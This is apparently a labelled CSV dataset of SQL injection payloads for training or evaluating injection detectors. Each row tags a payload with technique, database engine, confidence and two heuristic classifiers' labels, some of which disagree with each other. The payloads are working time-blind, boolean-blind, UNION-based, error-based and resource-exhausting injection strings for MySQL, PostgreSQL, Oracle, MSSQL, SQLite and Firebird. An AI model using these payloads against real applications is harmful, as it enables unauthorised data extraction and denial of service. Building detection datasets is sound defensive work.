payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and 'gfpd' = 'gfpd",time_blind,mysql,0.9,benchmark() for time blind,KEEP,,time_blind,mysql,925,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and 'gfpd' = 'gfpd"
"1"" and elt ( 8464 = 5761,5761 ) and ""ydmt"" like ""ydmt",boolean_blind,mysql,0.8,elt() for boolean blind,KEEP,,boolean_blind,mysql,926,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"1"" and elt ( 8464 = 5761,5761 ) and ""ydmt"" like ""ydmt"
"-7272"" ) union all select 9163,9163,9163,9163,9163,9163,9163--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,927,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-7272"" ) union all select 9163,9163,9163,9163,9163,9163,9163--"
"-5052 ) ) ) union all select 8351,8351,8351,8351#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,928,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-5052 ) ) ) union all select 8351,8351,8351,8351#"
"select * from generate_series ( 4465,4465,case when ( 4465 = 6232 ) then 1 else 0 end ) limit 1--",boolean_blind,postgresql,0.8,generate_series for boolean blind,KEEP,,boolean_blind,postgresql,929,boolean_blind,postgresql,generic SQL keywords without specific signal,boolean_blind,postgresql,generic SQL structure without strong signal,"select * from generate_series ( 4465,4465,case when ( 4465 = 6232 ) then 1 else 0 end ) limit 1--"
"1"" ) as gdcx where 2335 = 2335 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) --",time_blind,postgresql,0.9,pg_sleep() for time blind,KEEP,,time_blind,postgresql,930,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,"1"" ) as gdcx where 2335 = 2335 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) --"
"1"" rlike sleep ( 5 ) and ""veub"" = ""veub",time_blind,generic,0.9,sleep() with rlike for time blind,KEEP,,time_blind,generic,931,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)","1"" rlike sleep ( 5 ) and ""veub"" = ""veub"
"1 ) ) ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,932,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1 ) ) ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --"
waitfor delay '0:0:5' and 'dfzn' = 'dfzn,time_blind,mssql,0.9,waitfor delay for MSSQL time blind,KEEP,,time_blind,mssql,933,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected,waitfor delay '0:0:5' and 'dfzn' = 'dfzn
"1"" ) ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( ( ""enfu"" = ""enfu",time_blind,mysql,0.9,benchmark() for time blind,KEEP,,time_blind,mysql,934,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1"" ) ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( ( ""enfu"" = ""enfu"
"-6597'+ ( select aewz where 4036 = 4036 union all select 4036,4036,4036,4036,4036,4036,4036--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,935,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-6597'+ ( select aewz where 4036 = 4036 union all select 4036,4036,4036,4036,4036,4036,4036--"
-7864 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) # twpw,error_based,oracle,0.9,utl_inaddr for Oracle error-based,KEEP,,error_based,oracle,936,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected,-7864 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) # twpw
"-9736' or make_set ( 7311 = 2067,2067 ) and 'czdt' like 'czdt",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,937,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"-9736' or make_set ( 7311 = 2067,2067 ) and 'czdt' like 'czdt"
-2291 ) ) or 4067 = 5666#,boolean_blind,generic,0.8,OR comparison for blind,KEEP,,boolean_blind,generic,938,boolean_blind,generic,Pattern match: 'or 4067 = 5666' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-2291 ) ) or 4067 = 5666#
1%' and ( 3020 = 3020 ) *6703 and '%' = ',boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,939,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,1%' and ( 3020 = 3020 ) *6703 and '%' = '
1 ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( 5281 = 5281,boolean_blind,postgresql,0.8,CAST for PostgreSQL blind,KEEP,,boolean_blind,postgresql,940,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1 ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( 5281 = 5281
"-4031%"" union all select 9566--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,941,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-4031%"" union all select 9566--"
"1%' ) ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( '%' = '",heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,942,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1%' ) ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( '%' = '"
"( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ""vjlr"" like ""vjlr",time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,943,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ""vjlr"" like ""vjlr"
select ( case when ( 8820 = 4648 ) then 8820 else 8820* ( select 8820 from information_schema.character_sets ) end ) #,boolean_blind,mysql,0.8,CASE WHEN for boolean blind,KEEP,,boolean_blind,mysql,944,boolean_blind,mysql,generic SQL keywords without specific signal,boolean_blind,mysql,generic SQL structure without strong signal,select ( case when ( 8820 = 4648 ) then 8820 else 8820* ( select 8820 from information_schema.character_sets ) end ) #
"1 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,0.9,benchmark() for time blind,KEEP,,time_blind,mysql,945,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #"
"1' ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( 'rggg' = 'rggg",error_based,oracle,0.9,ctxsys.drithsx for Oracle error-based,KEEP,,error_based,oracle,946,error_based,oracle,Pattern match: 'ctxsys.drithsx' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'ctxsys.drithsx' detected,"1' ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( 'rggg' = 'rggg"
1' ) ) as dcen where 5852 = 5852 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) --,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,947,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,1' ) ) as dcen where 5852 = 5852 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) --
"-3443"" ) ) union all select 4043,4043,4043,4043,4043,4043,4043#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,948,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-3443"" ) ) union all select 4043,4043,4043,4043,4043,4043,4043#"
-8071 ) ) or 9160 = 4253,boolean_blind,generic,0.8,OR comparison for blind,KEEP,,boolean_blind,generic,949,boolean_blind,generic,Pattern match: 'or 9160 = 4253' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-8071 ) ) or 9160 = 4253
1 ) as vbli where 5139 = 5139 and 2782 = 2625--,boolean_blind,generic,0.8,OR comparison for blind,KEEP,,boolean_blind,generic,950,boolean_blind,generic,Pattern match: 'and 2782 = 2625' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1 ) as vbli where 5139 = 5139 and 2782 = 2625--
"1', ( select ( case when ( 3576 = 7744 ) then 1 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual )",boolean_blind,oracle,0.8,CASE WHEN for boolean blind,KEEP,,boolean_blind,oracle,951,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal,"1', ( select ( case when ( 3576 = 7744 ) then 1 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual )"
"-2394' ) union all select 1650,1650,1650,1650,1650,1650,1650--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,952,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-2394' ) union all select 1650,1650,1650,1650,1650,1650,1650--"
select ( case when ( 3365 = 6236 ) then 3365 else 1/ ( select 0 ) end ) --,boolean_blind,generic,0.8,CASE WHEN for boolean blind,KEEP,,boolean_blind,generic,953,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,select ( case when ( 3365 = 6236 ) then 3365 else 1/ ( select 0 ) end ) --
"( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ""wsmz"" like ""wsmz",time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,954,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ""wsmz"" like ""wsmz"
"1' ) union all select null,null,null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,955,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1' ) union all select null,null,null,null,null,null#"
select ( case when ( 3076 = 3596 ) then 3076 else 3076* ( select 3076 from mysql.db ) end ) #,boolean_blind,mysql,0.8,CASE WHEN for boolean blind,KEEP,,boolean_blind,mysql,956,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,select ( case when ( 3076 = 3596 ) then 3076 else 3076* ( select 3076 from mysql.db ) end ) #
1' ) as ncou where 9166 = 9166 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) --,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,957,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,1' ) as ncou where 9166 = 9166 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) --
"-8025"" ) or ( 1436 = 4186 ) *4186 and ( ""sqwv"" like ""sqwv",boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,958,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"-8025"" ) or ( 1436 = 4186 ) *4186 and ( ""sqwv"" like ""sqwv"
1' where 9602 = 9602,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,959,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' where 9602 = 9602
"-7083"" or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ""ajcl"" like ""ajcl",error_based,oracle,0.9,ctxsys.drithsx for Oracle error-based,KEEP,,error_based,oracle,960,error_based,oracle,Pattern match: 'ctxsys.drithsx' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'ctxsys.drithsx' detected,"-7083"" or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ""ajcl"" like ""ajcl"
"-1055"" or ( 8459 = 8459 ) *4906 and ""kdbr"" = ""kdbr",boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,961,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"-1055"" or ( 8459 = 8459 ) *4906 and ""kdbr"" = ""kdbr"
"1%"" ) ) union all select null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,962,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1%"" ) ) union all select null,null,null,null--"
"-4085'+ ( select aipn where 5493 = 5493 union all select 5493,5493,5493,5493,5493,5493,5493#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,963,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-4085'+ ( select aipn where 5493 = 5493 union all select 5493,5493,5493,5493,5493,5493,5493#"
1 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,964,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,1 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #
"1' ) as rqzz where 4987 = 4987 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,965,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1' ) as rqzz where 4987 = 4987 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --"
"-9532 ) ) union all select 6039,6039,6039,6039--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,966,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-9532 ) ) union all select 6039,6039,6039,6039--"
"1"" and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ""tjbe"" like ""tjbe",boolean_blind,firebird,0.8,Case when for Firebird blind,KEEP,,boolean_blind,firebird,967,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,"1"" and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ""tjbe"" like ""tjbe"
"-9553"" ) as geih where 6453 = 6453 or 8453 = 8159--",boolean_blind,generic,0.8,OR comparison for blind,KEEP,,boolean_blind,generic,968,boolean_blind,generic,Pattern match: 'or 8453 = 8159' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","-9553"" ) as geih where 6453 = 6453 or 8453 = 8159--"
"1 ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )",time_blind,oracle,0.9,dbms_pipe for Oracle time blind,KEEP,,time_blind,oracle,969,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"1 ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )"
"-2378"" where 2686 = 2686 or 6872 = 6872--",boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,970,boolean_blind,generic,Pattern match: 'or 6872 = 6872' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","-2378"" where 2686 = 2686 or 6872 = 6872--"
"-5313' ) union all select 7187,7187,7187#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,971,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-5313' ) union all select 7187,7187,7187#"
"-7858' ) union all select 1541,1541,1541,1541,1541,1541#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,972,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-7858' ) union all select 1541,1541,1541,1541,1541,1541#"
select ( case when ( 2716 = 8138 ) then 2716 else 2716* ( select 2716 from mysql.db ) end ) #,boolean_blind,mysql,0.8,CASE WHEN for boolean blind,KEEP,,boolean_blind,mysql,973,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,select ( case when ( 2716 = 8138 ) then 2716 else 2716* ( select 2716 from mysql.db ) end ) #
"select count ( * ) from generate_series ( 1,5000000 ) --",heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,974,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"select count ( * ) from generate_series ( 1,5000000 ) --"
"1"" ) where 6478 = 6478 union all select null,null,null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,975,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1"" ) where 6478 = 6478 union all select null,null,null,null,null,null#"
"-5771' ) ) union all select 2833,2833,2833,2833,2833,2833--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,976,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-5771' ) ) union all select 2833,2833,2833,2833,2833,2833--"
"1"" ) as kbjt where 2012 = 2012 and ( 5978 = 6898 ) *6898--",boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,977,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) as kbjt where 2012 = 2012 and ( 5978 = 6898 ) *6898--"
"-2397 ) ) as oizy where 1746 = 1746 union all select 1746,1746,1746,1746,1746,1746#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,978,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-2397 ) ) as oizy where 1746 = 1746 union all select 1746,1746,1746,1746,1746,1746#"
1 ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( 7079 = 7079,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,979,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,1 ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( 7079 = 7079
"1' ) ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ( 'asdc' like 'asdc",error_based,mysql,0.85,extractvalue() with procedure analyse,KEEP,,error_based,mysql,980,error_based,mysql,Pattern match: 'extractvalue (' → error_based (P4); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1' ) ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ( 'asdc' like 'asdc"
1' ) ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( 'foop' like 'foop,error_based,oracle,0.9,utl_inaddr for Oracle error-based,KEEP,,error_based,oracle,981,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected,1' ) ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( 'foop' like 'foop
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( 6051 = 6051",time_blind,sqlite,0.85,randomblob() for time blind,KEEP,,time_blind,sqlite,982,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( 6051 = 6051"
"-9046' ) ) as ymqc where 3733 = 3733 union all select 3733,3733,3733,3733,3733,3733,3733--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,983,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-9046' ) ) as ymqc where 3733 = 3733 union all select 3733,3733,3733,3733,3733,3733,3733--"
( case when 2646 = 8520 then 2646 else null end ),boolean_blind,generic,0.8,CASE WHEN for boolean blind,KEEP,,boolean_blind,generic,984,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,( case when 2646 = 8520 then 2646 else null end )
1' ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( 'mfmk' = 'mfmk,error_based,oracle,0.9,xmltype() for Oracle error-based,KEEP,,error_based,oracle,985,error_based,oracle,Pattern match: 'xmltype (' → error_based (P4); DB signature: oracle,boolean_blind,oracle,generic SQL structure without strong signal,1' ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( 'mfmk' = 'mfmk
"-1269' or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and 'gohv' like 'gohv",boolean_blind,mssql,0.8,CONVERT for MSSQL blind,KEEP,,boolean_blind,mssql,986,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"-1269' or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and 'gohv' like 'gohv"
